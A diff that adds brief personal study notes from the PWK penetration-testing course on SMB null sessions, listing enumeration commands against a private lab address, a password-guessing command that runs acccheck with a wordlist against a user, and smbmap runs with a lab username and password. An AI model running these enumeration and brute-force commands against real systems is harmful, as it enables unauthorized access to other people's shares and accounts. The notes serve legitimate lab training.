@@ -1,1 +1,21 @@
 ..
+
+Things I learned during my studies for PWK course regarding the SMB Null Session. 
+
+
+enum4linux -U 192.168.230.152 
+nmblookup -A 192.168.230.152
+smbclient //LAZYSYSADMIN/share -I 192.168.230.152 
+
+
+
+To extract 
+
+acccheck -v -t 192.168.230.152 -u username -P /usr/share/wordlists/dirb/common.txt
+
+to attempt guessing the password of a specific user 
+
+smbmap -r -u togie -p togie -d workgroup -H 192.168.230.152
+smbmap -r -u togie -p togie -d workgroup -H 192.168.230.152
+
+
